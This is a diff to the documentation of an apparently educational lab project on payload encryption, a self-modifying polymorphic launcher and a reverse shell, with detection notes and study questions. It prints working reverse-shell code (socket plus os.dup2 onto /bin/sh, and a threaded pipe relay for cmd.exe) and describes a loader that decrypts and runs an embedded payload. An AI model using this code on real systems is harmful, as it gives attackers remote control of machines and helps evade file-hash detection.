@@ -925,7 +925,7 @@ flowchart TD
 The generated program, when it runs:
 
 1. **Rewrites its own source file**, replacing a random signature token. Its SHA-256 therefore changes on every run while its behaviour stays exactly the same.
-2. **Decrypts with the embedded random key** using AES-256-GCM and verifies the payload's SHA-256 digest.
+2. **Decrypts with the embedded random key** using AES-256-GCM, whose authentication tag verifies the payload's integrity (a wrong key or any tampering makes decryption fail — no separate digest check is needed).
 3. **Executes the payload**, forwarding its own command-line arguments to it.
 
 The payload is supplied by the operator as a file. The generated program decrypts its payload with the `cryptography` library, which must be importable at run time (installed for the script, or bundled into the `.exe` by PyInstaller).
@@ -985,7 +985,7 @@ sha256sum polymorphic_demo.py
 Expected observations:
 
 1. The program prints the same payload output on each run.
-2. It verifies the embedded payload's SHA-256 digest before executing it.
+2. It authenticates the embedded payload with the AES-256-GCM tag before executing it.
 3. It rewrites the signature token stored in its own source file.
 4. The file's SHA-256 hash changes after every self-modification, while the output does not.
 
@@ -1011,6 +1011,8 @@ The two files differ because each generation uses a fresh key, nonce and signatu
 
 `lab/reverse_shell_payload.py` is the payload used for the subject's demonstration. It connects back to a listener the operator controls and hands the connection to a local shell.
 
+The subject's classic reverse shell wires the socket straight onto the shell's standard handles with `os.dup2`:
+
 ```python
 import os, socket, subprocess
 
@@ -1022,7 +1024,15 @@ os.dup2(s.fileno(), 2)
 subprocess.call(["/bin/sh", "-i"])
 ```
 
-The three `dup2` calls point the shell's standard input, output and error at the socket, so the remote shell talks over the connection instead of the terminal.
+That `dup2` form is **POSIX-only**: on Windows a socket handle is not a low file descriptor, so `os.dup2(sock, 0)` fails with `OSError: [Errno 9] Bad file descriptor`. Because the subject requires a Windows VM, `lab/reverse_shell_payload.py` instead **relays the shell over the socket with pipes and two threads**, which behaves identically on Windows (`cmd.exe`) and Linux/macOS (`/bin/sh`):
+
+```python
+process = subprocess.Popen(shell, stdin=PIPE, stdout=PIPE, stderr=STDOUT, bufsize=0)
+# thread 1: socket.recv()  -> os.write(process.stdin)
+# thread 2: os.read(process.stdout) -> socket.sendall()
+```
+
+The effect is the same — the remote shell reads its input from, and writes its output to, the connection instead of a local terminal — but it works on the audit's Windows target.
 
 **The target address and port are always chosen by the operator**, through `--host` and `--port`, and default to `127.0.0.1`. There is no discovery, no scanning, no persistence, no privilege escalation, no lateral movement and no evasion. The payload opens exactly one TCP connection to the address it was given.
 
@@ -1218,7 +1228,7 @@ The generated artifacts decrypt with the `cryptography` library (the same librar
 
 ### SHA-256
 
-SHA-256 maps input bytes to a 256-bit digest. It is useful for checking whether the original and recovered files are byte-for-byte identical. Even a small change in the generated Python source normally changes its SHA-256 digest, which is why the polymorphic demo's hash changes when its nonce changes.
+SHA-256 maps input bytes to a 256-bit digest. It is useful for checking whether the original and recovered files are byte-for-byte identical. Even a small change in the generated Python source normally changes its SHA-256 digest, which is why the polymorphic demo's hash changes every run when it rewrites its own mutation token.
 
 ### File size and random padding
 
@@ -1232,23 +1242,22 @@ Producing a `.exe` is a separate packaging step: the launcher and the encrypted 
 
 ### Reverse-shell threat model
 
-A reverse shell has the target initiate an outbound connection and redirect the command interpreter's standard input, output and error over it. This project implements exactly that in `lab/reverse_shell_payload.py`:
+A reverse shell has the target initiate an outbound connection and feed a command interpreter's input and output over it. This project implements exactly that in `lab/reverse_shell_payload.py`, using a cross-platform pipe relay so it works on the audit's Windows VM:
 
 ```python
 s.connect((host, port))
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
-subprocess.call(["/bin/sh", "-i"])
+process = subprocess.Popen(shell, stdin=PIPE, stdout=PIPE, stderr=STDOUT, bufsize=0)
+# thread 1: s.recv()  -> os.write(process.stdin)      (listener's keystrokes -> shell)
+# thread 2: os.read(process.stdout) -> s.sendall()    (shell's output -> listener)
 ```
 
-The three `dup2` calls are the give-away: a process whose standard handles all point at the same socket is not reading from a terminal. That is a strong, cheap detection signal, and it is worth naming in the audit.
+The give-away is the same whether the socket is wired on with `os.dup2` (POSIX) or relayed through pipes (the portable form above): a command interpreter (`cmd.exe` / `/bin/sh`) whose input and output are tied to a network socket is not talking to a terminal. That is a strong, cheap detection signal, and it is worth naming in the audit.
 
 For the audit, the likely evidence is:
 
 - an outbound connection to an address that the host has no business contacting;
 - a command interpreter whose parent is a program that should not launch one;
-- standard-handle redirection onto a socket;
+- a shell process reading from / writing to a socket (directly via `dup2`, or via a relaying parent);
 - the process tree showing a chain of unusual parent/child relationships.
 
 The key defensive point is that **a reverse shell is visible on the network even when the file is invisible**. The file may be encrypted, padded, polymorphic and new every time — and the connection still shows up in egress logs, proxy logs and network telemetry. That is precisely why the encryption and polymorphism in this project do not amount to evasion.
@@ -1264,7 +1273,7 @@ flowchart LR
     U[Auditor / learner] --> E[Evasion CLI]
     U --> P[Polymorphic CLI]
     E --> H[HBX1 container]
-    E --> K[Key file or embedded random key]
+    E --> K[Random key embedded in the runner artifact]
     H --> R[Runner: wait, decrypt, launch]
     R --> O[Payload executed as a child process]
     E --> R2[Container mode: recover to disk]
@@ -1397,7 +1406,7 @@ Do not disable endpoint protection outside the lab, deploy these payloads on sys
 - Why must a GCM nonce not be reused with the same key?
 - How is the final artifact size calculated, and is the increase exact?
 - At what stage is the delay enforced, and who enforces it — the tool or the artifact?
-- How does the runner protect its key if the key is not stored in the artifact?
+- Where is the key stored, and what is the security consequence of embedding it in the runner artifact?
 - Why does the runner decrypt with the `cryptography` library, and how does the `.exe` carry it?
 - What changes in a polymorphic run, and what remains stable?
 - Why can a whole-file hash change without a meaningful change in behavior?
